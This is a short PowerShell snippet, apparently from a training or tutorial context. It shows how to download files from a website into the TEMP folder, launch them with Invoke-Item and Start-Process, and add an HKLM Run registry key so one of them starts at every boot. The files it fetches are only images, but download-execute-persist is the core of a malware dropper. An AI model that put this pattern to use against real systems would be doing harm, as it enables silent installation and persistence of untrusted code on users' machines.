# Problem: I need a script to download files from the internet and if they are programs, run them.

# Solution:  Either Powershell's Invoke-WebRequest or Curl

$source = "https://www.informationwarfarecenter.com/images/ATC-Web20-Logo.png"
$source2 = "https://www.informationwarfarecenter.com/images/Jeremy-Martin.jpg"
$destination = "$env:TEMP\ATC-Web20-Logo.png"
$destination2 = "$env:TEMP\Jeremy-Martin.jpg"
 
#download with invoke-webrequest
Invoke-WebRequest $source -OutFile $destination -ErrorAction Stop

#download a file with curl
curl $source2 -OutFile $destination2
 
#run the program Invoke-Item
Invoke-Item $destination

#run the program with Start-Process
Start-Process -FilePath $destination2 -PassThru

#Add a registry key
new-itemproperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -name StartMe -value $destination -ErrorAction SilentlyContinue
